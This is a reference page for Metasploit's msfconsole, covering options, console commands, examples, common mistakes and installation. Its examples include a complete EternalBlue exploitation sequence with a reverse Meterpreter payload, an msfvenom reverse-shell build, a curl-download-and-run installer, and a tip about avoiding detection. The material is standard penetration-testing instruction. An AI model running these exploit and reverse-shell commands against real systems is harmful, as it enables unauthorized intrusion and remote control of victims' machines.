# msfconsole

**Metasploit Framework Console** — the primary interface for the Metasploit Framework, used for exploit development, penetration testing, and vulnerability research.

## Syntax

```
msfconsole [options]
```

## Purpose

Launch the Metasploit interactive console to search for and execute exploits, generate payloads, run auxiliary modules, and manage post-exploitation activities. The central hub for the entire Metasploit ecosystem.

## Common Parameters

| Parameter | Description |
|-----------|-------------|
| `-q` | Quiet mode (no banner) |
| `-x <cmd>` | Execute command on startup |
| `-r <file>` | Run resource script |
| `-L` | Disable logging |
| `-v` | Verbose output |
| `-i <uri>` | Connect to a database URI |

## Important Commands (inside msfconsole)

| Command | Description |
|---------|-------------|
| `search <query>` | Search modules (e.g., `search eternalblue`) |
| `use <module>` | Select a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`) |
| `show options` | Show configurable options for current module |
| `set <option> <value>` | Set a module option (e.g., `set RHOSTS 10.10.10.1`) |
| `setg <option> <value>` | Set a global option (persists across modules) |
| `run` / `exploit` | Execute the selected module |
| `back` | Leave current module |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with a session |
| `info` | Show detailed module information |
| `show payloads` | List compatible payloads |
| `check` | Check if target is vulnerable |

## Examples

```bash
# Start msfconsole quietly
msfconsole -q

# Search for a module
msf6 > search eternalblue

# Use a module and configure it
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.10.5
msf6 > run

# Generate a standalone payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf > shell.elf

# Run commands from a resource script
msfconsole -r auto_exploit.rc
```

## Common Mistakes

- Forgetting to set `LHOST` for reverse payloads — the target cannot connect back.
- Using the wrong payload architecture (x86 vs x64) — the exploit connects but the payload crashes.
- Not running `show options` before running a module — missing required parameters cause failures.
- Running exploits without `check` first — you may crash a non-vulnerable service.
- Leaving Meterpreter sessions open — cleanup is important to avoid detection.
- Not using a database — `db_status` with PostgreSQL enables search caching and session tracking.

## Real-World Usage

- **Exploit development:** Test and refine exploits against known vulnerabilities.
- **Penetration testing:** Chain exploits with post-exploitation modules for lateral movement.
- **Payload generation:** Use `msfvenom` (bundled) to create custom payloads for various platforms.
- **Vulnerability validation:** Confirm CVE findings with working Metasploit modules.
- **CTF challenges:** Many TryHackMe rooms walk through Metasploit-based exploitation.

## Compatibility

| OS | Support | Notes |
|----|---------|-------|
| Linux | Full | Pre-installed on Kali Linux |
| Windows | Full | Installer available (Metasploit Community) |
| macOS | Full | via Homebrew or `msfinstall` script |

```bash
# Install on Linux
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall
```
